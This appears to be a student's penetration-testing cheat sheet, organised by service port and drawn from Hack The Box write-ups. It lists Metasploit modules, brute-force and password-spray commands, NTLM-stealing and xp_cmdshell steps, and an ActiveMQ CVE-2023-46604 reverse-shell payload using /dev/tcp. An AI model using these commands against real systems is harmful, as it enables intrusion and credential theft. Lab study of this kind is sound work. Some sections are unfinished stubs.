# FTP (21)
FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and a server over a TCP/IP network. FTP is designed for the transfer of files between computers on a network. It allows users to upload, download, delete, and manage files on a remote server.
## Replacement 
The main concern with FTP is that it is a very old and slow protocol. FTP is a protocol 
used for copying entire files over the network from a remote server. In many cases, there is a need to 
transfer only some changes made to a few files and not to transfer every file every single time. For these 
scenarios, the **rsync** protocol is generally preferred.

The changes that need to get transfered are called deltas. Using deltas to update files is an extremely 
efficient way to reduce the required bandwidth for the transfer as well as the required time for the transfer to complete. [^3]
## Connection
```bash
$ ftp <USER>@<IP>
```
>[!NOTE]
> If Anonymous FTP login allowed, use anonymous as user
## Commands 
- ls
- get [FILE]
- mget [FILE] [FILE]
- put [FILE]
- exit
## Exploits
vsftpd 2.3.4 
- CVE-2011-2523 -> exploit/unix/ftp/vsftpd_234_backdoor (Metasploit)
	- Backdoor on port 6200
Upload a reverse shell
```ftp
put shell.php
```
# SSH (22)
## General 
```bash
$ ssh <USER>@<IP>
```
## Options 
```bash
-p <PORT>
```
# Telnet (23)
Telnet is a network protocol that allows a user to communicate with a remote device over a TCP/IP network. Originally designed for remote login to devices and systems over a network. It enables users to execute commands on a remote machine as if they were physically present.
```bash
telnet <IP> <PORT> 
```
>[!NOTE]
>This service has been replaced by SSH (22) due to lack of encryption (Telnet transmitts data in plaintext).
# RPC (135) 

# SMB (137,138,139,445)
Originally designed to operate on NetBIOS over TCP/IP (NBT) and uses port 139 for session services port 138 for datagram services, and 137 for name services.
## SMB 1.0 Name Services (137)
## SMB 1.0 Datagram Services (138)
## SMB 1.0 Session Services (139)
## SMB 2.0+ (445)
Direct SMB over TCP
## Implementations
- **CIFS** (Common Internet File System): Microsoft's implementation of the SMB protocol
	- Ex. **microsoft-ds** (Microsoft Directory Services)
 		- Refers to the Diectory Services component of Active Directory, but it also encompasses services for file sharing and network resouce management.
- **Samba**: An open source SMB implementation highly popular in Linux/Unix/MacOS
- **NQ** (YNQ,jNQ,NQ storage): SMB implementation developed by Visuality Systems
- **Fusion File Share**: Formerly known as Tuxera SMB, it is a proprietary implementation of Samba by Tuxera Inc.
## SMB Shares Enumeration
```bash
$ smbmap -H <IP>
```
```bash
$ smbclient -L -N \\<IP>
```
- \-N: No Password
## SMB Common Shares
- **ADMIN$**: Administrative shares are hidden network shares created by the Windows NT family of 
operating systems that allow system administrators to have remote access to every disk volume on a 
network-connected system. These shares may not be permanently deleted but may be disabled.
>[!NOTE]
> If you have access to this share, then you can use psexec.py to get a shell running at nt authority/system
- **C$** - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
- **IPC$** - The inter-process communication share. Used for inter-process communication via named 
pipes and is not part of the file system.
## SMB Share Selection
```bash
$ smbclient  \\\\<IP>\\<SHARE>
```
### Commands
- **dir**: list files in current directory
- **more** <FILE>: see contents of file
- **get** <FILE>: download file to attacking device
- **cd**: change directory
- **put** <FILE>: upload file to target device

## Exploitation
### Samba
**Vulnerability**: Samba 3.0.20 < 3.0.25rc3 can be vulnerable to **CVE-2007-2447**, which allows remote code execution due to insufficient access control.
#### Exploitation using Metasploit
```bash
use exploit/multi/samba/usermap_script
set RHOSTS
set LHOST
```
### psexec.py
This script is part of Impacket, a collection of Python classes designed for working with network protocols, primarily in security and penetration testing contexts. The specific script demonstrates PSEXEC-like functionality, enabling remote command execution on a Windows machine over SMB (Server Message Block) using a service called RemComSvc.
#### Requirements 
- Port 445 (SMB) is OPEN
- Administrator-level credentials (access to ADMIN$)
- Target is Windows
- Permissions to install services on the target
```bash
python <PATH TO psexec.py> username[:password]@IP
```
>[!WARNING]
> pkexec is preferred in simulated testing environments, but it can be easily detected by the Windows Defender in real-world assessments


# Rsync (873)
Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, 
to/from another host over any remote shell, or to/from a remote rsync daemon. It offers 
a large number of options that control every aspect of its behavior and permit very 
flexible specification of the set of files to be copied. It is famous for its delta
transfer algorithm, which reduces the amount of data sent over the network by sending 
only the differences between the source files and the existing files in the 
destination. Rsync is widely used for backups and mirroring and as an improved copy 
command for everyday use.
## Connection
### General Syntax
```bash
rsync [OPTIONS] … [USER@]<HOST>::<SRC> [DEST]
```
### List all Directories Available to Anonymous
```bash
rsync --list-only <IP>::
```
### List all Directories Avaiable to a User
```bash
rsync --list-only <USER@><IP>::
```
### List all files in Directory/Share 
rsync --list-only <USER@><IP>::<SHARE>
### Copy/Sync File
rsync <USER@><IP>::<SHARE>/<FILE> <FILE>
### List all 

# MSSQL (1433)
Microsoft SQL Server  is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications.
## Default MS-SQL System Tables
- **master** Database: This database captures all system-level details for a SQL Server instance.
- **msdb** Database: SQL Server Agent utilizes this database to manage scheduling for alerts and jobs.
- **model** Database: Acts as a blueprint for every new database on the SQL Server instance, where any alterations like size, collation, recovery model, and more are mirrored in newly created databases.
- **Resource** Database: A read-only database that houses system objects that come with SQL Server. These objects, while stored physically in the Resource database, are logically presented in the sys schema of every database.
- **tempdb** Database: Serves as a temporary storage area for transient objects or intermediate result sets.
## Automatic Enumeration
### No Credentials
Nmap:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```
Metasploit:
```bash
msf> use auxiliary/scanner/mssql/mssql_ping
```
### With Credentials
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
## Manual Enumeration
### Login
MSSQLPwner
```bash
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```
### Impacket's mssqlclient.py
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```
### Sqsh
```bash
# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
## Gaining RCE After Initial Foothold
1. Check if user is sysadmin (1:yes, 0:no)
```SQL
SELECT is_srvrolemember('sysadmin');
```
2. Check if xp_cmdshell is already activated
```SQL
EXEC xp_cmdshell 'net user';
```
3. Active xp_cmdshell (if needed)
```SQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
4. 
# MQTT (1883)
Message Queuing Telemetry Transport 




# MariaDB (3306)
To connect to MariaDB, one can use the command mysql
## Display help
```bash
mysql --help
```
## Connect to Database (Passwordless)
```bash
mysql -h <TARGET_IP> -u root [--skip-ssl] [-P <PORT>]
```
## Commands
**Prints out the databases we can access**
```MariaDB
SHOW databases;
```
>[!NOTE]
> There are three default databases: **information_schema**, **mysql**, and **performance_schema**

**Select Database**
```MariaDB
USE <DATABASE>;          
```
**Prints out the available tables inside the current database**
```MariaDB
SHOW tables;
```
**Prints out all the data from the table {table_name}**
```MariaDB
SELECT * FROM <TABLE>;
```
# RDP (3389)
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device. [^2]
## Ex. Service: ms-wbt-server (Microsoft Terminal Services)
## Enumeration
### Automatic
```bash
$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
It checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
### Brute Force
	Be CAREFUL you might lock accounts 
### Password Sprays
	Be CAREFUL you might lock accounts 
#### Crowbar
https://github.com/galkan/crowbar
```bash
$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### hydra
```bash
$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
	
## Connection
### xfreerdp
#### Fixed Screen:
```bash
xfreerdp /u:<USER> /p:<PASSWORD> /cert:ignore /v:10.10.73.136 /workarea /tls-seclevel:0
```
#### Adjustable Screen:
```bash
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.15.71  /tls-seclevel:0 /smart-sizing
```
# Distcc (3632)
Distcc is a distributed compiler tool that speeds up compilation by offloading tasks to other networked systems running the `distccd` daemon.
## Exploitation
**Vulnerability**: Distcc can be vulnerable to **CVE-2004-2687**, which allows remote code execution due to insufficient access control.
### Test Exploit using Nmap
Nmap can be used to test the vulnerability by executing a command on the remote system, such as retrieving the `id` of the current user:
```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```
### Exploitation with Metasploit
You can exploit this vulnerability using Metasploit:
```bash
use exploit/unix/misc/distcc_exec
```
# Postgresql (5432,5433)
An open source object-relational database system. This is a versatile system that builds upon the SQL language.
## Connection
```bash
psql -h localhost -p 9001 -U christine
```
## Commands 
- \l: list databases
>[!NOTE]
> If you find a database called **rdsadmin** you know you are inside an AWS postgresql database
- \c <DATABASE>: use database 
- \d: list tables in current database
- \du+: get users roles
Displays all fields from database
```bash
SELECT * FROM <DATBASE>: 
```
# AMQP (5672)
Advanced Message Queuing Protocol

# Windows Remote Management (WinRM) using HTTP (5672)
WinRM is a Microsoft protocol that allows for remote management of Windows machines.
## Ex: Microsoft HTTPAPI httpd
Microsoft HTTPAPI (HTTP API) is a component of Windows that provides the underlying infrastructure for handling HTTP requests and responses. When referring to "httpd 2.0" in this context, it generally indicates a web server that uses HTTPAPI to handle web requests.
## Usage
```bash
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```
# Redis (6379)
Redis (**RE**mote **DI**ctionary **S**erver) is an open-source advanced NoSQL key-value data store used as a 
database, cache, and message broker. This is an in-memory data structure (stored in the server's RAM). The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives 
to provide consistency.[^1]
## The server
Redis runs as server-side software so its core functionality is in its server component. The server listens for 
connections from clients, programmatically or through the command-line interface.[^1]
## The CLI
The command-line interface (CLI) is a powerful tool that gives you complete access to Redis’s data and its 
functionalities if you are developing a software or tool that needs to interact with it.[^1]
## Database
The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the 
database to disk at varying intervals to persist it as a backup, in case of failure. [^1]
## Connection
```bash
redis-cli -h <IP>
```
## Server Info
```redis-cli
info
```
Ex Result:
```redis-cli
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0

[** SNIP **]

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
The keyspace section provides statistics on the main dictionary of each database. The statistics include the 
number of keys, and the number of keys with an expiration.In the above example, under the 
Keyspace section, we can see that only one database exists with index 0.

## Selecting a Database 
```redis-cli
select <#>
```
## List all Keys in a Database
```redis-cli
keys *
```
## Get a key from the Database
```redis-cli
get <KEY NAME>
```
# MongoDB (27017)
MongoDB is a leading open-source NoSQL database that utilizes a document-oriented data model, allowing for the storage of data in flexible, JSON-like documents known as BSON. This flexibility enables developers to work with dynamic schemas, making it easy to adapt to changing application requirements without the constraints of traditional relational databases. With its powerful query language, rich indexing capabilities, and robust aggregation framework, MongoDB supports complex data operations and efficient data retrieval. It is designed for scalability and high availability, offering features such as horizontal sharding and replica sets to ensure data redundancy and reliability. Commonly used in applications ranging from content management systems to real-time analytics and e-commerce platforms, MongoDB is favored for its performance and versatility in handling diverse data workloads.
## Default Databases 
UniFi Network Controller
- ace
## Connection
External:
```bash
mongo mongodb://IP:PORT
```
Internal:
```bash
mongo --port PORT
```
## Show Databases 
```mongo
show dbs
```
## Select Datbase
```mongo
use <DATABASE>
```
## Show Collections in Current Database
```mongo
show collections
```
## Dump Contents of Collection
```mongo
 db.<COLLECTION>.find().pretty();
```
**Enumerate Users in the Default Databse**
Less Verbose:
```mongo
 db.admin.find().pretty();
```
More Verbose: 
```mongo
 db.admin.find().forEach(printjson);
```
## Execute Mongodb Command from Command Line:
```mongo
mongo --port PORT DEFAULT_DB --eval "SCRIPT, ex. db.admin.find().pretty();
```
# STOMP (61613, 61616)
Streaming Text Oriented Messaging Protocol

# ActiveMQ OpenWire Transport (61616)
Message Broker (like RabitMQ and Kafka). Written in Java and popular with Java Applications
## Exploitation
### CVE-2023-46604-RCE-Reverse-Shell-Apache-MQ
#### Option 1: Metasploit
#### Options 2: Github
1. Clone repository
2. Alter poc-linux.xml
```bash
<list>
	<value>bash</value>
	<value>-c</value>
	<value>bash -i >& /dev/tcp/IP/PORT 0>&1</value>
</list>
```
3. Entity Encode the bash command in poc-linux.xml
```bash
<list>
	<value>bash</value>
	<value>-c</value>
	<value>bash -i &#x3E;&#x26; /dev/tcp/IP/PORT 0&#x3E;&#x26;1</value>
</list>
```
```bash
<list>
	<value>bash</value>
	<value>-c</value>
	<value>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</value>
</list>
```
4. Start Http Server
```bash
sudo python3 -m http.server 80
```
5. Start Reverse Shell Listener
```bash
nc -lvnp 9001
```
6. Run Exploit
```bash
go run main.go -i TARGET_IP -p PORT=61616 -u http://ATTACKING_IP:80/poc-linux.xml
```
# Mystery Port
## Connection
```bash
$ nc <IP> <PORT>
```

[^1]: dotguy. “Redeemer Write-Up.” Https://App.Hackthebox.Com/, Hack The Box, blob://app.hackthebox.com/d5cf9163-a224-4a41-aa5c-4bfff818c408. Accessed 18 Sept. 2024. 
[^2]: "3389 - Pentesting RDP". Https://book.hacktricks.xyz/, HackTricks, https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp. Accessed 18 Sept. 2024.
[^3]: amra. “Synced Write-Up.” Https://App.Hackthebox.Com/, Hack The Box, blob://app.hackthebox.com/3947d501-c875-4759-8a43-85dd72f215e3. Accessed 18 Sept. 2024.
